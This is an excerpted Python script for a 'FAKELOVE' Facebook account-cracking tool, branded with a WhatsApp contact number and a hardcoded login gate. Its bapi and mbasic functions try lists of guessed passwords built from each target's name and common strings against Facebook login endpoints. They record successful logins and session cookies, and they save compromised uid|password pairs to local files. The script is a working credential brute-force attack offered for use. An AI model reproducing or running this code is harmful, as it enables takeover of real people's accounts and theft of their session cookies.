...
\x1b[1;95m ▀▄▀▄▀▄𝙊𝙛 𝙀𝙅𝙄𝙈𝙈𝘼𝘿𝙐▄▀▄▀▄▀

\x1b[1;63mMESSAGE ME ON WHATSAPP IF YOU NEED ANY HELP +2349060320010""") 

os.system("clear")
CorrectUsername = "FAKELOVE"
CorrectPassword = "Ejjimmaddu"
loop = 'true'
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            os.system('xdg-open https://wa.me/message/JQQ3ESNIEUYPF1')
    else:
...
def menu():
	...
	print("\033[1;97m[\033[1;92m03\033[1;91m] FAKELOVE MULTI ID's crack\033[1;93m [ \033[1;95mPRO \033[1;89m]")
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[1;91m[FAKELOVE-CP]\033[1;91m %s|%s|%s %s %s"%(uid, pw, day, month, year))
...
def bapi(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[0;91m[\033[0;92mfakelove_Cracking\033[0;91m]\033[0;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"1", name+"12", name+"111", firstname+lastname,fullname, "123456", "223344", "334455", name+"123" ]
	elif len(name)<=2:
		pwx = [ name, name+"1", name+"12", name+"111", firstname+lastname,fullname, "123456", "223344", "334455", name+"123" ]
	elif len(name)<=3:
		pwx = [ name, name+"1", name+"12", name+"111", firstname+lastname,fullname, "123456", "223344", "334455", name+"123" ]
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[1;97m[\033[1;92mFAKELOVE-OK\033[1;97m]\033[1;92m %s|%s|%s\033[0;97m"%(uid, pw))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[1;97m[\033[1;91mFAKELOVE-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[1;97m[\033[1;91mFAKELOVE-CP\033[1;97m]\033[1;91m %s |%s | %s"%(uid, pw))
				cp.append("%s | %s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s | %s\n"%(uid, pw))
				break
				continue
...
def mbasic(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[0;97m[\033[0;93mfakelove_Cracking\033[0;97m]\033[0;93m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"1", name+"12", name+"111", firstname+lastname,fullname, "123456", "223344", "334455", name+"123" ]
	...
	def main(user):
		...
		try:
			for pw in asu:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r\033[1;97m[\033[1;92mFAKELOVE-OK\033[1;97m]\033[1;92m %s | %s | %s"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					print("\r\033[1;97m[\033[1;91mFAKELOVE-CP\033[1;97m]\033[1;91m %s|%s\033[0;91m"%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
...
def setting_ua():
	...
	if ua =="":
		...
		print("Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]")
		os.system("rm -f .ua")
		time.sleep(1)
